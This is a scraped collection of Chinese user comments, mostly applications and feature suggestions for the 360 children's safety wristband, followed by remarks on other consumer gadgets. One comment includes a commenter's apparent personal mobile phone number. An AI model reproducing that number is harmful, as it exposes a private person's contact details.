这个产品有个致命的缺陷，那就是产品太花哨，会让孩子学习的注意力不集中，上课时他们会时不时地把玩，给小伙伴们炫耀。现在很多学校基本不允许小学生带表，就是因为这个原因。建议做成卡片型的，可以缝到孩子的书包里。
很喜欢。这个非常有用。孩子一天天大了。
担心2岁的孩子，手上是不是能戴着，其实做成项链什么的也好呀，如果能够足够小
很喜欢，宝宝现会走路了，有时生怕出点什么状况，前两天还有报纸在刊登又出现儿童失踪的情况。认为太有必要有这样的产品出现了。不仅是宝宝，还有老人，有时我妈出去后，总担心她又无法找回家了，这个东东感觉非常适合家庭需求。
向发起人致敬，做了一件好事。
要给机会试用啊，期待
好喜欢 已经提交申请 不知道有没有机会试用
申请通过，什么时候试用
已经填表了，不知道有没有机会试用。好期待哦
加了一层保障，希望有机会试用
呵呵，电脑现在离不开360杀毒、工作离不开360云盘，看来小孩也离不开360保姆了，不错，加油360
这个太好了好喜欢。什么时候销售呀。如果能试用就好了
享受科技生活,感触智慧人生~
大概什么时候可以销售啊
我喜欢这个东西
今天的心都
这个不错，申请试用。
老周又给
比较喜欢折腾醒产品，关系到孩子安全的产品，舍得花钱。作为360的铁杆，看到使用就赶紧申请了。
我也想要，这不仅仅是给孩子们的，我们学生也需要，因为时尚，而且比大人们的宣传效果好，大人不关注，小孩太小不知道，只有我们学生才关注
想让她有跟加多的空间玩，多和其它小朋友玩玩，想让他大胆一下，多在外面玩，又怕走丢，有了360儿童卫士，就不用担心了。...
360儿童卫士好东西，期待中
360儿童卫士好东西，期望能试用一下,这样就不用担心小孩，又想让她有跟加多的空间玩，想让他大胆一下，多在外面玩，有怕走丢，有了360儿童卫士，就不用担心了。
360儿童卫士好东西，期望能试用一下
功能实用贴心服务啊，热盼上市啊
好东西啊，每个家长的最爱！希望功能越来越强大，家长们行动起来吧，用户体验和意见最宝贵！让360越做越好，越做越强大！！这样大家才会更好的东西！双赢的局面是每个人的努力！
感谢背后的工程师。
好东西，期望尽快上市。
感谢360工程师们，能为广大的儿童的安全设计出这么好的产品！
首先感谢360的各位工程师们，能为广大的儿童的安全设计研发出这么好的产品，非常不易 如果手环能配上针孔摄像头（最好有两种模式可选{摄像和拍照}如果考虑储存内存和成本的话采用只拍照的模式也可）的话，既隐蔽又能看到不法分子的面貌和儿童的周边环境，然后手环能自动将拍摄到的影像上传到网盘或者发送到监护人的手机上，这样第一时间就能给孩子的监护人提供方便寻找的条件，为寻找留下线索。
我觉得还可以再退出老年款的，为人子，还是希望能时刻了解父母的行踪状态以确保他们安全的
有没有辐射的影响，
360儿童卫士值得每个有孩子的家长拥有
腕带的尺寸如何控制？可以多级调节吗？如何防止儿童丢失腕带？只提到了声音采集功能，没有说是否具有通话功能？
我一直都用360的产品，信得过，360儿童卫士加油！期待360儿童卫士!!!!!!!
这款产品真是太好了，我的孩子就需要一款这样的产品 当父母的放心多了。期待尽快上市。
非常棒，刚性需求，一定买，周老板加油！
Great！
我很关心这个产品，希望得到申请，会多提改进和BUG的
期待尽快上市，非常有创意的产品。自己都构思了很久，既然有了，乐享其成。
期待中，360加油！快快快快！！！！！！！！！！！！！！！！！！！
这个产品非常好，特别喜欢。希望360会原来越好！一直都支持360，电脑，手机都用360卫士。
能定位到看看孩子去哪 了 非常期待
嗯：这个产品好，我最喜欢用360卫士的，电脑，手机都用360卫士；我今也来申请试用了。谢谢…！
啊！还有看管小孩的强大功能啊，之前都没有仔细看功能就申请试用了，唉，这下完了，最强大的功能都没有写上，肯定申请不了了。要的话看来只有掏腰包了..........
360儿童卫士，家长朋友的福音，儿童安全的卫士！我真的非常 期待，希望能中奖，不中奖，也希望能尽快推出这款产品 给我家儿子一个漂亮的手表，给我一个放心的工具。
我真的非常 期待，希望能中奖，不中奖，也希望能尽快推出这款产品
期待中，希望能中奖，不中奖，也希望能尽快推出
希望我也能参与使用，我参加了360很多活动，都没有中奖！
就是支持！
试用不了，产品成熟了照样要买，为了孩子，谁都舍得！
看这产品真心不错，很喜欢，期待中。。。
看这产品真心不错，很喜欢，期待中。。。
360儿童卫士，家长朋友的福音，儿童安全的卫士！
如果能有更多的配套产品就更好了。体积更小的那种，纯记录位置的。希望能参加试用，给我家儿子一个漂亮的手表，给我一个放心的工具。
真心希望能够入手评测
希望参与使用，从没中过奖！！
不错，配套的APP最好先下载下来，让给大家熟悉一下！
真心喜欢，不错的产品，希望后续产品同样给力！
如果出个内置到书包上的定位产品更好。 轻巧便利。
这个还不错，设计理念很人性化，希望给我一个使用评测的机会。
希望参与使用。360的产品试用很多了 这个也不像错过了，360的活动很多，可惜在360从没中过奖
惩治熊孩子的必备产品！
希望参与使用。别的不想多说，，产品怎么样，试了才知道，
添加个NFC解锁就好了，可以用NFC功能解锁，取下儿童卫士。
真是贴家长心的一款产品，这款360儿童卫士我是相当关注和喜欢.因为这也是我对孩子的一种关爱和责任。希望能给予我一次评测机会。谢谢！
非常希望参与试用，宝宝的安全是全家的幸福，很在意手环的实际表现，强烈要求参加试用
这个产品确实很不错，希望对宝宝足够安全，建议出个类似功能的脚链，因为担心这么好看的东西，别人看到了容易抢走。
什么时候能买到啊？希望待机时间能长点吧，最起码也要3-4天吧！
希望能申请到试用，希望能得到机会，让宝宝更安全，也让大人更放心我要把自己的试用心得给其他孩子的爸爸妈妈一起分享。
这个确实好啊，有了这个，孩子一个人在小区里玩就不是太担心了，上学放学也放心了
真的是很贴家长心的一款产品，360一直致力于免费帮助用户，支持，特别是帮助孩子们推广360儿童卫士，我们都感觉到了360的贴心呵护，让我们把爱心传递下去。
可以买几个吗。还有我朋友也想加入本公司行吗？
希望能申请到试用，我一定会把自己的试用心得给其他孩子的爸爸妈妈一起分享。
很贴家长心的一款产品，一直信赖360的产品，如果得到了，一定会写份详细的试用感受！如需费用，合理范围内，也可以
申请了，希望能得到机会，让宝宝更安全，也让大人更放心
很好的创意实用产品，对现今社会的繁忙宝爸宝妈来说，实时掌控孩子的位置，心里对孩子就少了份担心，孩子们必须拥有的产品，为了孩子们的安全，我们也要帮助360，帮助孩子们推广360儿童卫士
试过才知道
真心希望可以得到试用权，，这款产品好强大的说！！
申请了，很不错的产品，值得支，。给孩子一份安全守护。
申请了，看到新闻就很想给宝宝买一台，希望可以当首批试用者。
希望可以得到试用。
360真的不错！很想给宝宝试用！
一直挺360软件
看着介绍,真是很好的产品,做了申请了,不知道能不能有机会试用.一直很支持360的产品,这次推出的这款产品,更是非常符合当前的需要.希望能申请到的朋友,认真试用,积极反馈和推荐,争取要更多的人认识和接受并使用这个新产品.全社会都应该认真重视儿童的健康和安全问题.
这个东西好强大，又实用，我坚决支持360一切的产品，谁叫我在360的排名超过了全球99.77%的用户呢
申请了，试用一下，哈哈
我申请了，看了下功能很好希望我能为自己的女儿申请到一个，祝女儿永远健康开心快乐！
申请了，如果得到试用，会提我个人的愚见的。
从360开始到现在，一直追寻到现在，也一直在关注，我挺你360，360儿童卫士，真真实实的为民着想
我也申请了。不过孩子的年龄我写错了。
首先，我查看了功能，功能并不完善，希望有如下功能 1，快速照相传输到终端的功能， 2，警报声音的设定和发出，远程开启 3，危险提升，即超出正常活动范围的提示，需要提示终端，并在设备上发出语音提示小朋友。 4，儿童锁或者是一个专业锁止机构，防止被随意取下。
申请了 能拿到的概率 很低 不知道什么时候可以买的到
希望能获得试用！很不错的产品！
前阵子刚跟朋友念叨着是不是有这样的产品，现在就发现了，申请使用一下，不错的东东。
很好的产品，希望能获得申请
看介绍不错，希望可以申请下来，给宝宝多一层保护
申请了，期待能够批给我，嘿嘿
申请了，不知道能不能批下来，好期待！
挺不错的，想使用看看效果。
手机电脑全部都是用的360的产品，产品不断的创新和优化是我一直使用的理由。申请了一个儿童卫士，希望能够成为它的第一批使用者。
申请试用是不是就是预订啊，我预订了，什么时候发货啊。
看介绍好像不错哦！我们也申请了，好产品哦！
很不错，喜欢，来支持
强烈申请开源或者支持扩展，作为IT从业者，希望为孩子们贡献自己的一部分力量。
各方面都很好，就是如果不是单向通话就好了，如果孩子也能给别人打电话，拨电话号码，那样的话就好了。
不错 赞一个
关注这款产品好久，从360安全卫士，到360杀毒，360ROOT工具，360随身wifi（用两个号买了10多个）。一直到现在这个儿童卫士。希望能得到测评机会，能实实在在的为用户想着的，个人认为非360莫属了，任凭那些抹黑的，负面的新闻随意发布，但是从个人角度上讲，完全相信360的实力，期待能带给我们更多的不同和惊喜！
我是一名360和奇酷的忠粉...对于这款360儿童卫士相当关注和喜欢.因为这也是对孩子的一种关爱和责任.希望奇酷和360能给予我一次评测机会.谢谢!! 忠粉电话:15208232865
360很强大，支持360，切实为用户着想，其他的损毁360的产品无地自容去吧，你们也弄点实际的为民的产品来说话。
为我女儿申请一个希望能中奖
太好了，一切为了孩子，必须赞！
非常期待，本来我自己就想给孩子做一个全球定位器，有了这个就少费点脑力了。不错，建议有孩子的家长人手一个！
希望也给老年人使用，希望监控一些健康指标，增加紧急按键，或者一键通话类似功能
很期待这款产品，毕竟孩子是父母的一切。赞一个
太好了给我家妞妞申请一个
强烈申请开源或者支持扩展，作为IT从业者，希望为孩子们贡献自己的一部分力量。
好东西。要试试。体验科技感受。
很好的思路，只是不知道产品怎么样，希望试试，看看做得是否完善，有没有需要改进的
360想得很周到，真不愧是周总呀。顶顶顶。。。
用了多少年360啦，随身wifi出来时就疯抢，现在，有能关心孩子的手环那就更不能放过啦，希望申请能通过，期待中ing......
看了这段视频，功能挺全面的，如果用会很放心
这款，确实期望值很高，会受很多家长们的欢迎的
这款儿童卫士绝对热卖！
智能手环，360的奇思妙想，希望尽快批量生产。。。。
刚申请了，期待中……
用了多少年360，当随身wifi出来时，真是兴奋极了，不过介于家中已有路由器了，就没买了，今天，当360智能手环出现时，我无语了，是激动的无语了，360给我创造了一个又一个精彩，一个又一个奇迹!360，你什么时候出智能手机啊?!
感觉这个东西应该会很不错，绝对会火
申请试用了，希望能选中，更希望能了解续航时间，能给个答复吗
期待中……
我也申请了 不过申请的东西没能中过
360的产品wifi 1解决了我的大问题，现在公司的同事都用的wifi2.期待360儿童卫士能给我再次解决我家里的大难题
申请试用了，希望能选中，更希望能了解续航时间，能给个答复吗？
申请试用了，希望能收到360给的惊喜
好 很好 非常好
申请试用了，希望第一时间能用到。
申请试用了，希望第一时间能用到。
希望可以成功申请，360的产品最有爱了。支持360产品，360的附身ＷＩＦＩ也不错哟！
我是360安全卫士产品的用户以及拥护者。同时支持360儿童卫士.希望能够申请到360儿童卫士的手环.
这个东西可以有效保护小孩不去到陌生地区。赞一个。。。
希望可以成功申请，360什么的最有爱了。支持360产品，啦啦~
申请试用了，希望能成功。
申请试用了，希望第一时间能用到。
有360这样富有社会责任感，富有创意的公司真的不多，好样的！继续加油！
很期待哦，希望能申请试用成功！
智能穿戴，是今后的发展方向，从小培
很期待中，很高端的产品，求试用
非常希望能够申请成功，这样小伙伴再也走不丢了 建议安全区域能手动修改
非常希望申请能够成功
非常希望申请成功，更期待
手环怎么摘下来，会不会被别人拿走了。
希望能成功试用。呵呵。谢谢啊。小孩用得上。
会不会被人认为是在监听，还有手环离开孩子身体自动报警不，电力续航怎么样，通话质量如可，辐射大么，安全性能怎么样
有360这样富有社会责任感，富有创意的公司真的不多，好样的！继续加油！并希望申请能通过~~~
建议增设一键拨打指定电话或者报警功能。
好喜欢！希望申请成功！
想拿掉手环的时候,应该有预警措施.
期待申请试用，谢谢哦！
非常希望申请成功，更期待
非常非常期待
这种东西个人认为乃家中有小朋友必备之物，目前还不知道售价如何，希望和360其他产品一样，具备高信价比，同时也希望我能试用成功。
希望能申请成功，也祝360越做越强！
申请成功了就发试用报告
现在特别喜欢360，手机就是用的360特供机，已经申请了，希望能试试
我也申请试用了，360加油吧，产品做的好起来。
希望能申请到
很看好这个产品，对有小孩子的家庭真的太实用了。
对360的好感与日俱增。
我也申请了，360我一直看好，可惜公司没在内地上市，要不然可以陪着她一起成长了~！
这个产品的到来将会给我们孩子带来很好的安全保障，希望做的更好，为我们的孩子用360，365天，天天平安~
申请了，希望能够拿到看看好不好用，这个对付熊孩子最好
实用，创新，高科技！360科技改变我们的生活！
以前申请买了360wifi 很好用 相信这个儿童卫士也会很好用
现在小孩都是家长心头的一块肉，人性化设计，感觉不错！能帮我们这些忙于工作的家长带来许多便利。
非常好的产品，希望该产品可以解决很多儿童被拐卖的问题。替广大儿童的父母，感谢360。
申请了，希望成功……
非常好的产品，希望能真正做到孩子的安全卫士，已申请。
至少是一款良心产品，哪怕只是抓住消费者心理的商机，这样的商家赚钱我们心安理得！
我也申请了，不知道有没有份
帮朋友申请的，希望能申请成功
非常的符合俺们需求。希望能申请成功。
这个好棒啊，一定要保佑我申请成功啊！
非常的实用，
科技改变生活ing...支持360
希望能申请成功，期待中。
超赞的好东东，希望能申请成功，随时关注宝宝。
真是太棒了，一定要申请成功啊！
这么好的产品，有孩子的必须拥有！！我也要申请！！！！
希望可以试用
老人家也同样需要。
希望能申请成功
好看、实用、神器，家长们现在急需的一样东西，科技改变生活呀。。。希望申请成功，产品早日上市。。
不要SIM卡，能不能进行GSP定位？
看下了产品介绍 功能好多啊 防水还有时间 还有录音 定位 太实用了 希望能申请成功
怎么申请不了呀
不知道待机时间是多少？给孩子买一个，再安装一个在车上。哈哈是不是超赞呢？
希望能申请成功
硬件主要2个模块GPS模块跟SIM卡模块，软件很关键，很希望能得到。
希望能申请成功。也希望360儿童安全卫士能让更多的家长放心安心
还要买个包月的流量卡塞进去，这样的话孩子只用在这个手表上是不是很浪费？
我也想让孩子拥有一个，这样孩子出门时家长才能放心，还可以帮助孩子学习，真是太神了。真期待啊!
接上面提点建议：卡扣能不能设计成不容易解下来的，或者专人才能解下来的那种啊，防止孩子或者坏人给手环解下来。手环界面的显示能不能加上日期和星期，看起来就像一个手表，大一点的孩子也有佩戴的兴趣。
家中孩子4岁半，正是活泼好动的年纪，管束太紧不好，让孩子自由自在的撒欢，现在的社会环境又不放心，360儿童安全卫士确实抓住了家长的心理，应该会很受欢迎的！本人也申请了试用。没有见到实物，就图片和文字介绍说几句：颜色好看，样式好看，解决了很多家长担心的问题。
好像给儿子买一个
很神奇的宝贝，将来必火，支持360创意多多
非常好的产品，相信360儿童手环能帮助和避免孩子的丢失！
期待试用成功。
希望成功 哈哈
多一重安全给孩子
360太有才了！！！！
已经申请，想要蓝色的！不知道什么时候能大规模上市，这是上班家长的又一贴心力作！
360终于爆发了，做到人性化，将是一个未来的新的热点。支持360安全，守护孩子和个人电脑，给力！
好产品，很想给孩子弄一个！
怎么预定呢+
信3哥，得永生
很实用的样子，不知道什么时候正式上架啊
真心感谢360！为了舅舅的孩子我真心希望能试用成功，就算幸运之神没来到我身边，花再多的钱我也甘愿买。因为没有舅舅就没有我，包括爸妈所有人都抛弃了我，但舅舅和姥姥把我最终抚养成人，现在已是一名大学生，我现在能做的只有为他们而拼搏。我现在活着不是为了我自己，是为了我姥姥和舅舅一家！现在舅舅有了孩子，我有义务关心他们，就像当年舅舅和姥姥那样关心我一样！-
360终于爆发了，做到人性化，将是一个未来的新的热点。支持360安全，守护孩子和个人电脑，给力！
信鸿
非常期待使用
期待试用成功。
支持360，我很喜欢。
期待试用，不要让我们失望
360想变成中国的谷歌了
看着很好的样子
希望试用成功，太喜欢这个手环了，，爱死你们了
非常期待试用
不错的东西，爸妈的福音，孩子的宝贝
真的不错，期待产品正式上市，支持！
客户端软件可以支持WP手机吗？
希望时刻关注宝宝的安全！有了这个可以 时刻掌握宝宝的动态！
也是希望尽快用上，并且希望以后的功能会更加强大。
非常期待，希望时刻关注宝宝的安全，这个非常重要
期待试用！
怎么样预定购买啊？热切期盼今早能买到
对孩子是否有辐射，和给孩子买个手机有何区别
期待试用！
期待啊期待，呵呵~~~~~希望时刻关注宝宝的安全！这个确实很重要！
刚申请！我的宝贝大女儿，之前两次差点走失，把家人吓得半死，我之前也在网上搜索过类似的追踪报警器，功能一般没有新意，担心效果不好也没买，但一直害怕宝贝再出事，之前买过360WIFI感觉不错， 前几天看到的报道说360会出穿戴设备，没想到是切入到这个需求点，这个创意很不错，希望尽早上市测试一下效果，让我们作父母的不用担惊受怕。谢谢360！！！
申请好了，好期待哦！！！！！！！！！！！！！！！
已经申请试用，希望在合肥有更多孩子家长见到这款产品。
希望可以尽快使用上。
期待中...
申请了，人在外地，希望时刻关注宝宝的健康！
希望可以过，老周谢谢你，到处为客户着想。
刚刚申请了试用，希望幸运降临。希望能够预定快点用上！
已申请试用，希望可以成功。
希望申请成功
挺神奇的手环，申请试用了。这样孩子在哪玩家长随时可以掌控。
真是想父母所想，急孩子所需，不错，希望以后的产品都能这么贴心，已申请试用，希望能用到这么好的产品！
已经申请试用了，希望通过，很期待
申请了一个，呵呵。给宝宝一个安全防护 期待中。。。
老周@周鸿炜 需求抓得很准，又是一个大的产品创新，支持！
申请已经提上去了，静侯佳音哦~
已经申请了。好人一生平安。坏人嘛-----
已申请试用，希望可以成功。
已申请试用，为了女儿，加油！
外形时尚,功能性强,防水，方便儿童使用，已经申请了，很期待 ！
申请试用，希望不要失望。
已经申请了， 期待！！~
外形很时尚啊,功能性也很强,希望可以得到试用的机会啊!
已提交~孩子的安全是父母最大的心愿~
很期待！！
期待成为第一批适用者。由于父母工作繁忙，经常是爷爷奶奶，姥姥姥爷看着。希望后期完善更多互动功能，同时能拉近孩子与父母的距离。
申请了试用，很想知道试用效果
这个很期待！！
已经提交申请，静候佳音。
电池容量是不是太小了，正常使用能续航多久？
看着不错，能试用就更美了，期待中~
刚申请试用，不知能否用上，以前也总是希望哪个公司能出一款这样的产品，36O终于出了这款产品，期待试用。
不知道续航能力如何，要是一用就没电，就没办法定位孩子了
好像还可以吧，弄一个宝宝回家玩会
非常喜欢，真是件明星产品，解决实际问题，减少儿童丢失问题，值得期待。
产品总是不断解决问题的嘛，相信360。申请了试用不知道能否用得上。
大家等着吧，这款产品一定会越来越完善的以后应该会逐步添加对话功能吧
已提交申请，使用后再来评评儿童卫士的实用性。
申请了使用，不知道能不能收到货。其实，该硬件只具备一个奇虎公司自己的“奇信”的功能就够了，Msim卡只支持数据业务。
如果再加一个对讲功能那就盖了帽了
不知道充一次电能用多长时间，这么关键的参数怎么没有公开？
如果能给孩子发短信就好了。这个应该不难很容易实现。
这东西很不错，比现有的挂脖子的安全设施更具隐蔽性，比蓝牙功能的又无监控距离限制。申请试用+组团待购
确定了试用资格后让我把收货地址再修改下，有点小问题，万一收不到货不是遗憾了
很想试试用！
都有SIM卡了，如果能有接电话和定向拨号功能就更完善了。等待升级这两项功能后再购买。
期待有好的表现
360儿童卫士一日一充，售价两百块钱，需要插入电话卡，只能打入，不能打出（防止小孩沉迷游戏）。实惠。。。
期待期待，360公司又一杰作！生活实用性很高！
很喜欢！如果能在加上视频远程拍摄功能，我想这个产品就更完美了！
非常喜欢，真是件明星产品，解决实际问题，减少儿童丢失问题，值得期待。
期待。怎么预定想给孩子买个。申请试用也不知道什么时候？
故障免费更换吗？另外续航能力很重要
最好一切操作靠密码，包括：开关机、重启、打开手环；不易损坏的材质，防水；宁愿多掏点钱。
怎么预约？
不知道这个产品是否很容易从手腕上拿下来，最好加个密码锁什么的，没密码拿不下来，否则离开了手腕，其他都无从谈起
期待啊~~别跟小米学搞饥饿营销啊
无线wifi 很好用!这个估计错不了，期待快快上市！
我的感觉：首先产品很好，我们很需要，其次说缺点吧 1、看上去有点厚 2、貌似没有密码才能拿下来的机制 3、能不能增加通话功能（仅限预先设置的家长号码可以拨通，拨通自动应答免提通话）
创意很好，产品质量如何？是否实用？还有待考证！
喜欢。需要给小孩预备一个。还有，能有素一点的颜色给有老年痴呆症的老人用吗？
希望能想办法提高电池续航时间，再就是如果很容易就取下来，人贩子一下子给你取掉了也没那么实用了
产品参数中写GPRS定位，下面又写GPS定位，这小编就是瞎写，到底有没有GPS。能弄清楚再发上来不?
发评论可以预定吗？ 这么多年用360的免费产品 ，确实该掏钱买了
怎么买啊？
一次充电不知道能用多久啊~320貌似有点小。。。
不知道这个产品是否很容易从手腕上拿下来，最好加个密码锁什么的，没密码拿不下来，否则离开了手腕，其他都无从谈起
太厚了点。
产品参数中没有提到GPS定位，难道电池容量太小需要简化功能？光靠GPRS定位就太粗糙了。。。
可以用多长时间啊，怎么预定？
还应该增加表扣专用钥匙才能打开，强行破拆表扣马上报警到家长手机，这样孩子的手环被第三方破拆丢弃马上就能知道。
什么时候可以开放购买啊，好想买一个给我的女儿用。。。。。谢谢先，红衣教主
期待中，什么时候有啊
啥时候上线。。买个啊
期待~~~~~~~~
不得不说，这是一个良心产品。
什么时候上线啊？
我还以为这是什么高科技呢？本来还以为这会是无线的或者什么的，原来只是外界的一个壳子而已，看来很简单嘛
为何不是无线的？
。。。。恩，深圳人民分分钟搞定吧
外形相当不错 就是觉得没有什么亮点 不过这个产品的功能基本也就是这样。
真不错，就是稍微有点贵了。
感觉还不错 其实每个人家里都应该备上这么个设备吧..链接上手机倒蛮方便的 数据同步很快
同楼下 颜色好看！！
喜欢这个颜色 多少钱？国内有没有类似设计的推荐?
会不会造成不可预料的损坏啊..
哈哈这个外形看起来好像火炬呀..
这个东西引申出来一个情况 ，就是目前国内的插座实在是有太大的安全隐患了。插拔太危险。
我觉没有用，只能充手机，手机嘛可以搞个一个充电器多个插头的啊！
5V，24V直流还可以，220V交流等着挨查吧
这个真安全?
摸到上面要被电安逸
这个安全性，感觉不太好。
创意很好，但支持机型适合什么，耳机线及耳机损坏如何修复？
我只想知道那个插头是要插在哪
很实用的样子啊！
看上去挺实用
果然设计还是要能给人惊喜才算好 这个小创意 不过真解决问题了..赞
看着还是蛮酷的 话说 这个是不是需要匹配机型..我这个大屏的用的上吗？
原来360儿童手环就是抄的他的啊
360儿童手环。。。。
360儿童手环...
价格再便宜点就好了
能不能附带卖sim卡 上哪买sim开服务
哇 这个好精致..不过不知道紫外线功能对于国内的大多用户来讲有没有吸引力 倒是觉得诸如天气 PM2.5之类的检测大家更关心一些 不过外形不错 赞一个~~
好是好，样子多一点
为什么不做成帽子的样子啊 可以有更多的功能 设计也比较容易 也更好看啊
这才是未来社会发展的主流啊 什么穿戴设备都是浮云啊
这个好玩，放在两个卧室里。
好想要..
挺有意思的产品
这个产品什么时候才能出来啊？有兴趣
好玩，要是能买就好了
问：要是刚运动完心跳加速怎么办！？
挺好玩的，长得也挺好看
贵贵贵贵贵贵贵贵贵贵
小米才300元，华为要500，有点贵
太贵了!!!!!!!!!
产品不错就是太贵了
千年K3V2
电子产品淘汰速度很快，太贵，不值得购买！
华为值得信赖 不过这个介绍的不够详细建议 有视频介绍就更好了
就是一机顶盒嘛！还秘盒，快播还叫什么小方，我还是选择小米的！因为小米就叫盒子，你们就继续装b吧！
不错，华为的质量杠杠滴，不会是杂粮盒子那个鸟样
怎么到处都有这些垃圾水军在这里瞎叫唤。
还秘盒，以为便秘盒呢。
没货啊。。。
垃圾产品，太贵
看来的小伙伴真的应该做个导航评分了
健康监测类型的智能手表看了好多 到底哪个好呀。。。
早该做！！不过看看人家耐克的额
运动品牌也都开始玩硬件了，不知道智能硬件将来是否会成为运动品牌的标配
看着还行吧
手表主要还是电量要足够，如果用1到2天，还是手表么？直接叫手机算了。
喜欢 sonic算是这些家里面我最钟爱的 有保证
外观不错，但是从倒数第二张图来看软件界面一般，不知道实机会怎么样，很期待
期待啊~！！！希望我可以试用
se=second
什么时候可以支持安卓系统？
这个相当漂亮
SE是什么意思，难道是安全手环，总让我想到360SE浏览器
看起来比之前一代升级不少 大厂牌的号召力还是相当..
期待期待期待期待期待期待期待期待期待期待
这个 真的有用吗、、
那么大 喜欢
跟一块砖头似的，那么大
ni hao hello world htc
智能眼镜领域如果能像智能手表那样发展 将会令人震撼。
价格也不便宜，感觉配置会比较复杂，将来的趋势是wifi音箱还是蓝牙音箱呢？
音质应该没问题 这个，，价格可否在便宜亲民点
我已经预定了！期待ING！如果用的好，再推荐给小伙伴们！(*^__^*) 嘻嘻……
这个不错，很智能的样子~可以买个给高血压的老妈试试~现在老妈都是每天用一个小本记血压的
这个康康血压仪看着不错哦，之前我也为妈妈买了个血压仪，现在妈妈使用的还是传统的水银血压仪呢，测的总是不太准，还不方便，相信有了这个智能血压仪以后妈妈测量起来会很方便而且会很准的。赞一下哦
现在的智能设备越来越所涉及医疗 大方向呀..
有人买了?好玩吗?
买了。。实在是废物。。没大用。。晕死一下。。
请相信我们无比强大的山寨厂家门，用不了几天，这个玩意就会以白菜价问世
不支持iphone 本来想买一个玩玩的！
这是将来的发展趋势，功能必将更加强大。
可以买一个来玩玩
就是一个废物！记了个密码而已
好像是有点撤了、有以下不就知道了、拿财挡在
看了半天 不知道 这个实际有什么用途。。。。
扯淡。。。
NFC技术，下面问的人。你用的公交卡里面有电池吗？你百度一下NFC的是什么吧。
能告诉我 有什么作用不....我好像就看到一个NFC的作用 充电呢？难道一百年不用充电的？
介绍的一堆废话，只有两个功能点。
NFC技术 写入个人信息，密码 就类似的电子钥匙
说明书和广告文云山雾罩，看清楚后，其实啥用没有。就一摆设。
好象是用NFC技术，智能登录手机用户名、密码使用的。它跟手机可以在公交、刷卡消息是一样的原理，但需要手机也具有NFC的功能才可以使用。估计要安装相应的NFC APP应用。不过这里没说明指环是否需要用电，没电又怎么记录这用户名、密码呢？
小编还需努力 ！
完全不知道是在干嘛，需要电源？能够无限导出？能够记录路径？记录步伐？
具体的使用场景还不太明确，感觉需求不是很大，不过可以买一个来玩玩
/* */ /* *
看起来还是蛮酷的 其实眼镜这么小的屏幕不加显示屏也ok
看起来还是蛮酷的 其实眼镜这么小的屏幕不加显示屏也ok
外形很酷，可能老外会觉得很实用，但是在中国真的看不出什么价值
没想到竟还有这般神器！！着实可以 不过具体的操作体验还真有待验证呀
介绍就这么点？
价格在便宜点可以尝试购买
5个按钮和1个滚轮？看着有点复杂，不知道实际实用的感觉如何，想替代现有鼠标很难，不看好
这笔不 鼠标 要多少钱？如何便宜的话可以考虑试玩一下~
没想到还有这样的设计 可以..要是再便宜点就好了。
好东西，真的很适合家庭用。
这个价格没什么优势
这个盈利方式比较好，哪天就硬件不要钱，收取服务费吧
在国内还未表现出对这类产品的强大需求，体验过几款类似产品，用户体验上和这款差很多
看起来真酷！！喜欢黑色
外形很炫酷尤其钟爱黑色..如果价格合理的话真想入手一部
这个小东西太酷了，虽然短期内没有走向消费市场的可能，但是带来的想象是无限的
好像跟之前介绍的一款机器人差不多 也是组装的@奇酷？？
没想到外国人的创意有这么多 很想试玩一下..
看着的确很酷 就是不知到时带上的感觉如何了，，
好产品，相当于每个人的私人健身教练，去健身房不用很盲目的练习了， 可以掌握更科学的方法
对于健康设备来讲 这款特别之处在于针对健身的特定时刻进行检测并提醒 从外形看设计不错 至于软件方面的检测 数据测量也很具体 价格对于喜欢敬爱女神的各位来讲应该还算不错。期待成品
这个外观做的很棒啊.
shuai
一直对fitbit很满意感觉比jiawbone做的更好些 支持~
外观延续了FLEX的风格，多了一块显示屏，可以在手环上查看时间和各项运动数据了，而且多了上下楼梯的数据，不知道中国能卖多少钱，想入手一个
新款追踪的数据除了Fitbit过去的产品所包括的睡眠时间（包括深度睡眠时间）、运动时间、消耗的热量等，现在还增加了一项新的数据――你上下楼梯、上坡下坡等的数据。这是对监测数据的一项重要的补充，很喜欢~
新款追踪的数据除了Fitbit过去的产品所包括的睡眠时间（包括深度睡眠时间）、运动时间、消耗的热量等，现在还增加了一项新的数据――你的上下楼梯、上坡下坡等的数据。这是对监测数据的一项重要的补充，很喜欢~
一直带着会不会勒得慌~
感觉外观还不错 带上会不会有不舒服的感觉 例如时间久了有印呢..而且是上臂。。
这个不错哦
乍一看去像是手表 但仔细一看原来是臂环 待在手臂上作为测量..不过功能跟智能手表相当 只是没有显示面板 不过有相关App的帮助 道理还是一样的,,希望佩戴手感更好一些
能否多发点有创意示范模型视频，让人们更好认识它，利用和使用3D打印笔。
貌似只能画一些简单的线条画而已，而且可预见的是，耗材绝对很耗。。。
非常好玩的样子。要有好创意才行，要不浪费耗材。
这地有天赋绘画才行啊~
好神奇呀。。
超级喜欢超级喜欢啊啊啊
这叫画笔还差不多
超级喜欢超级喜欢啊啊啊
这叫打印？
哈哈 终于有购买链接了！！
非常好！！！！
再赞一次！！！
非常帅的产品。
赞一个。太棒了。!
这个打印笔真是太方便了。
很有趣的一款产品，貌似要出新一代了
这个太酷了！！哪里能买到 奇酷可以提供购买吗
在3D打印技术被炒得如火如荼的节点 这款#D打印笔的横空出世可谓恰到好处..满足了大多数创客对3D打印需求的体味而且性价比及趣味性俱佳 很好的一款国内硬件创客设备 希望更多好的产品用户能够接受
@李雪55 批量生产的话价格应该会低很多
看着酷能不能便宜一点呀..很贵的说
看好，这款设备可以利用Google Play海量的游戏资源，希望能体验一下
帅了！！送我一个吧
要是能自动进水和倒水就更强大了，哈哈，希望科技可以快速颠覆我们的生活，但是人会不会变得越来越懒惰
第一次见到有智能遥控地方水壶 不过科技生活的概念已经越来越逼近咱们的生活中来 可以预见..
木有iphone的表示很无用，，
设计理念不错，还是看个人习惯吧，有轻微强迫症的用户可能会喜欢，我个人应该不会在使用充电器之前还要把线缠来缠去
关键是，不太方便携带啊
感觉苹果的设计还是蛮新颖的 运用的设计简洁 可拆卸有多用途 这种设计的理念对于国内厂商产品研发很有启迪。
蓝牙的通病 距离不远..远的话成本又要高出很多 但定位的精准性我觉得才是最重要的
市场上确实已经有很多蓝牙追踪器，但是一旦超出限制距离就无法定位了，追踪器还是要有独立的通讯模块才能真正解决用户的问题
类似的蓝牙防丢器已经很多了吧
说实话，这是我见过的最不好看的徕卡...
原来不能买，，只能看看大师杰作了
这货太高端了，只能看看，发现徕卡logo和可口可乐太像了
本以为是智能相机 没想到原来是经典款 只有一个..eee看在大师的面子上多多支持啦
高端大气深刻！！
